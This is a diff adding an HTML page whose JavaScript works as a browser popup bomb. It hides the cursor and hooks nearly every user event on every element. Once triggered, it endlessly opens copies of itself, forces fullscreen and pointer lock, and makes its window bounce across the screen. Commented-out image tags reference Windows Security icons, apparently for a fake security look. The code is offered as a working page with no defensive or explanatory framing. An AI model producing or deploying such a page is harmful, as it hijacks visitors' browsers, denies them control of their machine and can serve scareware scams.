@@ -1,0 +1,230 @@
+<head>
+<style>
+    * {
+        cursor: none;
+    }
+</style>
+
+</head>
+
+<body onload="onload()">
+
+<!-- <input
+onfocus="this.focus(); repeat()"
+onblur="this.focus(); repeat()" 
+onload="this.focus(); repeat()" 
+onchange="this.focus(); repeat()" 
+onkeydown="this.focus(); repeat()"
+onkeyup="this.focus(); repeat()"
+autofocus /> -->
+
+<button onclick="repeat()">click</button>
+
+<!--
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Account.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Account.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Account.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Account.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/AppAndBrowser.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/AppAndBrowser.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/AppAndBrowser.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/AppAndBrowser.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Device.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Device.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Device.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Device.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Family.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Family.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Family.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Family.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Health.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Health.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Health.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Health.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Network.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Network.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Network.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Network.theme-light.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Threat.contrast-black.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Threat.contrast-white.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Threat.theme-dark.ico">
+<img src="file:///C:/Windows/SystemApps/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Assets/Threat.theme-light.ico">
+-->
+
+<script>
+function repeat() {
+  console.log("Ding!")
+  // var windows = setInterval(openWindow,1);             
+}
+
+var code_happened
+function start() {
+  if (code_happened == undefined) {
+      var a = setInterval(openWindow,500);
+      var b = setInterval(requestPointerLock,500);
+      var c = setInterval(openFullscreen,500);
+      code_happened = true;
+  }
+}
+// add event listeners to all elements
+Array.from(document.querySelectorAll('*')).forEach(el => {
+  el.addEventListener("beforeunload", start);
+  el.addEventListener("blur", start); 
+  el.addEventListener("click", start); 
+  el.addEventListener("error", start); 
+  el.addEventListener("focus", start); 
+  el.addEventListener("keydown", start); 
+  el.addEventListener("keypress", start); 
+  el.addEventListener("keyup", start); 
+  el.addEventListener("load", start); 
+  el.addEventListener("message", start); 
+  el.addEventListener("mousedown", start); 
+  el.addEventListener("mousemove", start); 
+  el.addEventListener("mouseout", start); 
+  el.addEventListener("mouseover", start); 
+  el.addEventListener("mouseup", start); 
+  el.addEventListener("popstate", start); 
+  el.addEventListener("resize", start); 
+  el.addEventListener("scroll", start); 
+  el.addEventListener("touchend", start); 
+  el.addEventListener("touchmove", start); 
+  el.addEventListener("touchstart", start); 
+  el.addEventListener("visibilitychange", start); 
+  el.style.color = "red";
+})
+
+function random(){
+  var i  = Math.floor(Math.random()*20)%3;
+  if(i<=0) return random();
+  return i;
+}
+
+
+function onload() {
+  playBall()  
+}
+const wins = []
+
+
+const SCREEN_WIDTH = window.screen.availWidth
+const SCREEN_HEIGHT = window.screen.availHeight
+const WIN_WIDTH = 480
+const WIN_HEIGHT = 270
+const VELOCITY = 15
+const MARGIN = 10
+const TICK_LENGTH = 50
+
+function requestPointerLock () {
+  Array.from(document.querySelectorAll('*')).forEach(el => {
+    const requestPointerLockApi = (
+      el.requestPointerLock ||
+      el.webkitRequestPointerLock ||
+      el.mozRequestPointerLock ||
+      el.msRequestPointerLock
+    )
+
+    requestPointerLockApi.call(el)
+  })
+}
+
+function openFullscreen() {
+  Array.from(document.querySelectorAll('*')).forEach(el => {
+    if (el.requestFullscreen) {
+      el.requestFullscreen();
+    } else if (el.webkitRequestFullscreen) { /* Safari */
+      el.webkitRequestFullscreen();
+    } else if (el.msRequestFullscreen) { /* IE11 */
+      el.msRequestFullscreen();
+    }
+    })
+}
+
+function focusWindows() {
+  wins.forEach(win => {
+    if (!win.closed) win.focus()
+  })
+}
+
+  function getRandomCoords() {
+    const x = MARGIN +
+      Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+    const y = MARGIN +
+      Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
+    return { x, y }
+  }
+
+  function openWindow() {
+    const { x, y } = getRandomCoords()
+    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+    const win = window.open(window.location.pathname, '', opts)
+    window.focus();
+  }
+
+
+function moveWindowBounce() {
+  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
+  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
+
+  setInterval(() => {
+    const x = window.screenX
+    const y = window.screenY
+    const width = window.outerWidth
+    const height = window.outerHeight
+
+    if (x < MARGIN) vx = Math.abs(vx)
+    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
+    if (y < MARGIN + 20) vy = Math.abs(vy)
+    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
+
+    window.moveBy(vx, vy)
+  }, TICK_LENGTH)
+}
+
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
+
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
+
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+function fOff(){
+        flagrun = 0;
+        }
+
+function playBall() {
+        xPos += xOff;
+        yPos += yOff;
+        if (xPos > screen.width-175){
+        newXlt();
+        }
+        if (xPos < 0){
+        newXrt();
+        }
+        if (yPos > screen.height-100){
+        newYup();
+        }
+        if (yPos < 0){
+        newYdn();
+        }
+        if (flagRun == 1){
+        window.moveTo(xPos,yPos);
+        setTimeout('playBall()',1);
+        }
+        }
+
+</script>
+</body>
